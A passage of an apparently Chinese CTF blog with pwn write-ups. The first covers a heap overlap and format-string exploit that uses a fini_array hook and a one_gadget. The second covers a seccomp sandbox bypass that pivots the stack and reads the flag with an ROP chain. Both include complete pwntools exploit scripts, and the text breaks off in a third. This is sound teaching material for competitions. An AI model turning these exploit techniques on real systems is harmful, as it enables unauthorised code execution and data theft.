title="大体思路"></a>大体思路</h3><p>稍微看一下漏洞挺多的</p><ul><li>main函数里有格式化字符串漏洞</li><li>delete_order函数里有uaf漏洞</li><li>edit_order函数里有任意堆覆盖漏洞，可以进行overlap</li></ul><p>堆我们不能自己申请，只能main前面申请了0x80大小的三个堆，后面submit时一个0x140堆</p><p>print(dest)</p><p>dest是第三个堆，我们可以利用先利用覆盖漏洞将第二个堆的size覆盖为0x150这样再delete这个堆就会把dest一块释放到bins，后面再submit申请时，就会申请到这个堆，submit这个堆是可以利用堆1和堆2中的值控制的，从而计算好偏移，控制dest，进一步利用格式化字符串漏洞</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">submit</span><span class="params">(<span class="type">char</span> *all, <span class="type">const</span> <span class="type">char</span> *order1, <span class="type">char</span> *order2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v7; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">strcpy</span>(all, <span class="string">&quot;Order 1: &quot;</span>);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(order1);</span><br><span class="line">  <span class="built_in">strncat</span>(all, order1, v3);</span><br><span class="line">  <span class="built_in">strcat</span>(all, <span class="string">&quot;\nOrder 2: &quot;</span>);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(order2);</span><br><span class="line">  <span class="built_in">strncat</span>(all, order2, v4);</span><br><span class="line">  *(_WORD *)&amp;all[<span class="built_in">strlen</span>(all)] = <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用格式化漏洞基本上都要先泄露地址，再布置改写地址，此题也不例外</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, v5);</span><br><span class="line"><span class="built_in">printf</span>(dest);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0LL</span>;</span><br></pre></td></tr></table></figure><p>但是在格式化字符串漏洞之后，就会ret，无法再次利用，这就需要我们利用 fini_array hook掉执行流</p><blockquote><p>fini_array hook</p><p><code>.init_array</code>和 <code>.fini_array</code>中存放了指向初始化代码和终止代码的函数指针。</p><p><code>.init_array</code>会在main()函数调用前执行，这样可以通过修该地址的指针来将控制流指向病毒或者寄生代码，因为比main执行还早，大部分恶意软件都是hook这个，感觉c++的构造函数或许和这个相关</p><p><code>.fini_array</code> 函数指针在 main() 函数执行完之后才被触发，感觉c++的析构函数或许和这个相关</p><p>在<code>.init_array</code> array[0]-&gt;array[1]</p><p>在<code>.fini_array</code> array[1]-&gt;array[0]</p></blockquote><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311172008247.png" alt="image-20230311172008247"></p><p>这样我们就可以二次利用漏洞进行改写地址</p><h3 id="具体细节"><a href="#具体细节" class="headerlink" title="具体细节"></a>具体细节</h3><p>刚开始的堆</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311172557368.png" alt="image-20230311172557368"></p><p>payload &#x3D; b”%”+str(2617).encode()+b”c%13$hn” + b’abc%51$p’ + b’def%26$p’<br>payload +&#x3D; b’A’*(0x74-len(payload))<br>payload&#x3D;payload.ljust(0x88,b’\x00’)<br>payload +&#x3D; p64(0x151)</p><p>edit(1,payload)</p><p>覆盖size的堆</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311172648818.png" alt="image-20230311172648818"></p><p>这里payload的%51是返回地址__libc_start_main+128的</p><blockquote><p>为什么是0x74呢</p><p>这里submit函数可以看出他还进行拼接，正常的话需要0x90个字节到达dest内容，</p><p>‘Order 1:<code>+</code>chunk1<code>+</code>\n<code>+</code>Order 2:<code>+</code>Order 1: ’ 拼接导致他会多28个字节</p><p>0x90-28&#x3D;0x74</p></blockquote><p>我们再</p><p>delete(2)</p><p>payload2 &#x3D; p8(0x0)*7 + p64(fini_array)<br>submit(payload2)</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">fgets(s, <span class="number">128</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( s[<span class="number">0</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Enter first </span></span><br></pre></td></tr></table></figure><p>这里我们利用fget，的s是在栈上的，gdb得到fini_array被写到了格式化字符串第13个参数</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311175311347.png" alt="image-20230311175311347"></p><p>0x400830和main地址 0x400A39只有一个字节的差距我们在第一个payload利用b”%”+str(2617).encode()+b”c%13$hn”改写为main，这样main ret是会再次返回到main</p><p>第一个pay的%26$p是</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311175610680.png" alt="image-20230311175610680"></p><p>他和后面的返回地址已经下次hook返回到main的地址的返回地址的栈地址偏移是固定的</p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311180117794.png" alt="image-20230311180117794" style="zoom:67%;"><p>计算出来<code>ret_bp=fixed-0x461-0x100</code></p><p>这样我们就可以改写这个main的返回地址为one_gadget地址</p><p>payload&#x3D;b’%’+str(one_gadget&amp;0xff).encode()+b’c%13$hhn%’+str(((one_gadget&gt;&gt;8)&amp;0xffff)-(one_gadget&amp;0xff)).encode()+b’c%14$hn’<br>print(payload)<br>payload +&#x3D; b’A’*(0x74-len(payload))<br>payload&#x3D;payload.ljust(0x88,b’\x00’)<br>payload +&#x3D; p64(0x151)<br>edit(1,payload)<br>delete(2)<br>payload&#x3D;p8(0x0)*7+p64(ret_bp)+p64(ret_bp+1)<br>submit(payload)</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311181810289.png" alt="image-20230311181810289"></p><p>拿到shell</p><p><img src="/2023/03/10/Chunk-Extend-and-Overlapping/image-20230311181846332.png" alt="image-20230311181846332"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./books_e_o&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">order, name</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;5: Submit\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(order).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27; order:\n&#x27;</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">order</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;5: Submit\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(order + <span class="number">2</span>).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit</span>(<span class="params">payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;5: Submit\n&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;5&#x27;</span> + payload)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Order 1: &#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Order 2: Order 1: &#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># db(&#x27;b *0x400A91&#x27;)</span></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">fini_array = <span class="number">0x6011B8</span></span><br><span class="line">main_addr = <span class="number">0x400A39</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;%&quot;</span>+<span class="built_in">str</span>(<span class="number">2617</span>).encode()+<span class="string">b&quot;c%13$hn&quot;</span>  + <span class="string">b&#x27;abc%51$p&#x27;</span> + <span class="string">b&#x27;def%26$p&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x74</span>-<span class="built_in">len</span>(payload))</span><br><span class="line">payload=payload.ljust(<span class="number">0x88</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x151</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">payload2 = p8(<span class="number">0x0</span>)*<span class="number">7</span> + p64(fini_array)</span><br><span class="line">submit(payload2)</span><br><span class="line">ru(<span class="string">b&#x27;abc&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;abc&#x27;</span>)</span><br><span class="line">__libc_start_main=<span class="built_in">int</span>(r(<span class="number">14</span>),<span class="number">16</span>)-<span class="number">128</span></span><br><span class="line">ru(<span class="string">b&#x27;def&#x27;</span>)</span><br><span class="line">fixed=<span class="built_in">int</span>(r(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">p(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line">p(<span class="string">&#x27;fixed&#x27;</span>,fixed)</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line">base=__libc_start_main-libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">ret_bp=fixed-<span class="number">0x461</span>-<span class="number">0x100</span></span><br><span class="line">p(<span class="string">&#x27;ret_bp&#x27;</span>,ret_bp)</span><br><span class="line">one_gadget=<span class="number">0xebcf5</span>+base</span><br><span class="line">p(<span class="string">&#x27;one_gadget&#x27;</span>,one_gadget)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>((one_gadget&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xffff</span>)</span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(one_gadget&amp;<span class="number">0xff</span>).encode()+<span class="string">b&#x27;c%13$hhn%&#x27;</span>+<span class="built_in">str</span>(((one_gadget&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xffff</span>)-(one_gadget&amp;<span class="number">0xff</span>)).encode()+<span class="string">b&#x27;c%14$hn&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span>*(<span class="number">0x74</span>-<span class="built_in">len</span>(payload))</span><br><span class="line">payload=payload.ljust(<span class="number">0x88</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x151</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">payload=p8(<span class="number">0x0</span>)*<span class="number">7</span>+p64(ret_bp)+p64(ret_bp+<span class="number">1</span>)</span><br><span class="line">submit(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Chunk Extend And Overlapping </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023黄河流域公安院校网络空间安全技能挑战赛 PWN</title>
      <link href="/2023/03/05/sd-police2023-pwn/"/>
      <url>/2023/03/05/sd-police2023-pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="SandBox"><a href="#SandBox" class="headerlink" title="SandBox"></a>SandBox</h1><p>链接：<a href="https://pan.baidu.com/s/1l3NhZ1xYwca48nf1p88iDg">https://pan.baidu.com/s/1l3NhZ1xYwca48nf1p88iDg</a><br>提取码：05zg</p><p>题目开启了沙箱机制</p><blockquote><p>沙箱(Sandbox)是程序运行过程中的一种隔离机制，其目的是限制不可信进程和不可信代码的访问权限。计算机领域的虚拟技术，常见于安全方向。会禁用一些系统调用</p><p>实现沙箱机制</p><ul><li><p>一种采用prctl函数调用</p></li><li><p>一种是使用seccomp库函数。</p></li></ul></blockquote><span id="more"></span><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/p/police-pwn-2023&gt; checksec sandbox</span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/police-pwn-2023/sandbox&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">grxer@grxer ~/D/p/police-pwn-2023&gt; seccomp-tools dump ./sandbox</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0001: 0x15 0x01 0x00 0x0000003b  if (A == execve) goto 0003</span><br><span class="line"> 0002: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0003: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>可以看到禁用了execve系统调用，同时system是不能使用的，因为system是glibc中的函数，用shell来调用程序&#x3D;fork+exec+waitpid</p><img src="/2023/03/05/sd-police2023-pwn/image-20230305122657981.png" alt="image-20230305122657981" style="zoom:80%;"><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">80</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  io(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;A bit small, but it doesn&#x27;t affect me cat flag&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x60</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h2><p>只有0x10个字节的大小，我们先进行栈迁移</p><p>选择bss&#x3D;0x404500</p><ul><li><p>我们先payload&#x3D;padding+p64(bss)+p64(read_ret)，由于是采用leave ret平栈，会把rbp改为bss地址，ret 到read</p><ul><li><img src="/2023/03/05/sd-police2023-pwn/image-20230305154743044.png" alt="image-20230305154743044" style="zoom: 67%;"></li></ul></li><li><p>payload&#x3D;padding+p64(bss+0x50)+p64(read_ret)，我们在bss-0x50输入</p><ul><li><img src="/2023/03/05/sd-police2023-pwn/image-20230305155002168.png" alt="image-20230305155002168" style="zoom:80%;"></li></ul></li><li><p>平栈后我们的rsp为0x404510(因为在leave mov esp,ebp后需要pop rbp和ret栈顶rsp会提高0x10),rbp为0x404550，再次返回read</p><ul><li><img src="/2023/03/05/sd-police2023-pwn/image-20230305155441801.png" alt="image-20230305155441801" style="zoom:80%;"></li></ul></li><li><p>payload&#x3D;p64(bss+0x60)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)会在bss输入payload</p><ul><li><img src="/2023/03/05/sd-police2023-pwn/image-20230305161933424.png" alt="image-20230305161933424"></li></ul></li><li><p>这里我们call read函数时会把返回地址放在0x404508处，我们把他覆盖为了pop rdi ；ret，所以在返回时就可以输出got表返回main</p><ul><li><img src="/2023/03/05/sd-police2023-pwn/image-20230305231637179.png" alt="image-20230305231637179" style="zoom:67%;"></li></ul></li><li><p>这样我们就可以返回main，再次循环利用迁移和覆盖read返回</p></li></ul><h2 id="ORW读取flag"><a href="#ORW读取flag" class="headerlink" title="ORW读取flag"></a>ORW读取flag</h2><p>对于<strong>32<em>位程序，应调用</em></strong>int $0x80进入系统调用，将系统调用号传入eax，各个参数按照ebx、ecx、edx的顺序传递到寄存器中，系统调用返回值储存到eax寄存器。</p><p>对于64位程序，应调用 syscall进入系统调用，将系统调用号传入rax，各个参数按照rdi、rsi、rdx的顺序传递到寄存器中，系统调用返回值储存到rax寄存器。</p><p>从使用上来看</p><ul><li>约定的传递参数的寄存器不同<ul><li>syscall 使用的是 edi 、 esi 、 edx 、 ecx，</li><li>int 0x80 使用的是 ebx 、 ecx 、 edx 、 esi 、 edi</li></ul></li></ul><p>从内部机制来看</p><ul><li>syscall 调用的是C库函数，是在用户空间的，并且最终还是会调用内核函数（入口点）</li><li>int 0x80 调用的是内核函数，是在内核空间的</li></ul><p>我们先把‘.&#x2F;flag’字符串通过read函数写入内存payload&#x3D;b’deadbeef’+p64(rdi)+p64(0)+p64(rsi_r15)+p64(0x404900)+p64(0x40)+p64(read_addr)+p64(main)</p><blockquote><p>三个文件描述符</p><p>0 标准输入</p><p>1 标志输出 </p><p>2 标志错误 </p></blockquote><p>在利用标准库里的syscall打开flag文件，read读取到内存</p><p>payload&#x3D;b’deadbeef’+p64(rdi)+p64(0x2)+p64(pop_rsi)+p64(0x404900)+p64(base+libc.sym[‘syscall’])<br>payload+&#x3D;p64(rdi)+p64(3)+p64(pop_rsi)+p64(0x404900)+p64(base+libc.sym[‘read’])+p64(main)</p><blockquote><p>syscall汇编如下</p><p><img src="/2023/03/05/sd-police2023-pwn/image-20230306010914175.png" alt="image-20230306010914175"></p><p>会把rdi rsi rdx等，依次给到rax rdi  rsi等 再内核函数syscall系统调用</p><p>open打开文件描述符需要提供给read函数，一般都是从3开始(012被标志占用)</p></blockquote><p>最后读取flag到标准输出，payload&#x3D;b’deadbeef’+p64(rdi)+p64(1)+p64(rsi_r15)+p64(0x404900)+p64(0x100)+p64(base+libc.sym[‘write’])+p64(main)</p><p>拿到flag</p><p><img src="/2023/03/05/sd-police2023-pwn/image-20230306012654458.png" alt="image-20230306012654458"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./sandbox&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line">libc= ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&#x27;1.13.251.106&#x27;</span>,<span class="string">&#x27;8004&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="comment"># db(&#x27;b *0x401214&#x27;)</span></span><br><span class="line">rdi=<span class="number">0x401283</span></span><br><span class="line">rsi_r15=<span class="number">0x0401281</span> </span><br><span class="line">read_ret=<span class="number">0x4011F1</span></span><br><span class="line">bss=<span class="number">0x404500</span></span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x50</span></span><br><span class="line">payload=padding+p64(bss)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x50</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">p(<span class="string">&#x27;main&#x27;</span>,main)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">puts_ad=u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p(<span class="string">&quot;puts_ad&quot;</span>,puts_ad)</span><br><span class="line"></span><br><span class="line">base=puts_ad-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_addr = base + libc.symbols[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_rsi = base + <span class="built_in">next</span>(libc.search(asm(<span class="string">&#x27;pop rsi;ret;&#x27;</span>)))</span><br><span class="line">mprotect = base + libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">p(<span class="string">&#x27;read_addr&#x27;</span>,read_addr)</span><br><span class="line">padding=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x50</span></span><br><span class="line">payload=padding+p64(bss)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x50</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(<span class="number">0</span>)+p64(rsi_r15)+p64(<span class="number">0x404900</span>)+p64(<span class="number">0x40</span>)+p64(read_addr)+p64(main)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">s(<span class="string">&#x27;./flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line">padding=<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x50</span></span><br><span class="line">payload=padding+p64(bss)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x50</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(<span class="number">0x2</span>)+p64(pop_rsi)+p64(<span class="number">0x404900</span>)+p64(base+libc.sym[<span class="string">&#x27;syscall&#x27;</span>])</span><br><span class="line">payload+=p64(rdi)+p64(<span class="number">3</span>)+p64(pop_rsi)+p64(<span class="number">0x404900</span>)+p64(base+libc.sym[<span class="string">&#x27;read&#x27;</span>])+p64(main)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">padding=<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x50</span></span><br><span class="line">payload=padding+p64(bss)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">payload=padding+p64(bss+<span class="number">0x50</span>)+p64(read_ret)</span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">b&#x27;deadbeef&#x27;</span>+p64(rdi)+p64(<span class="number">1</span>)+p64(rsi_r15)+p64(<span class="number">0x404900</span>)+p64(<span class="number">0x100</span>)+p64(base+libc.sym[<span class="string">&#x27;write&#x27;</span>])+p64(main)</span><br><span class="line"></span><br><span class="line">sa(<span class="string">b&#x27;flag\n&#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="flag"><a href="#flag" class="headerlink" title="flag?????"></a>flag?????</h1><p>链接：<a href="https://pan.baidu.com/s/1kHoiI7gXN0RLVzY1q7RPng">https://pan.baidu.com/s/1kHoiI7gXN0RLVzY1q7RPng</a><br>提取码：pdi2</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer ~/D/p/police-pwn-2023&gt; checksec pwn3</span><br><span class="line">[*] &#x27;/home/grxer/Desktop/pwn/police-pwn-2023/pwn3&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    </span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">96</span>]; <span class="comment">// [rsp+0h] [rbp-60h] BYREF</span></span><br><span class="line"></span><br><span class="line">  io(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x70</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和sandbox一样，只有0x10字节的溢出，seccomp-tools检测了一下并没有沙箱，简简单单拿个shellZzz，直接栈迁移ROP</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./flag???&#x27;</span></span><br><span class="line">libc= ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: 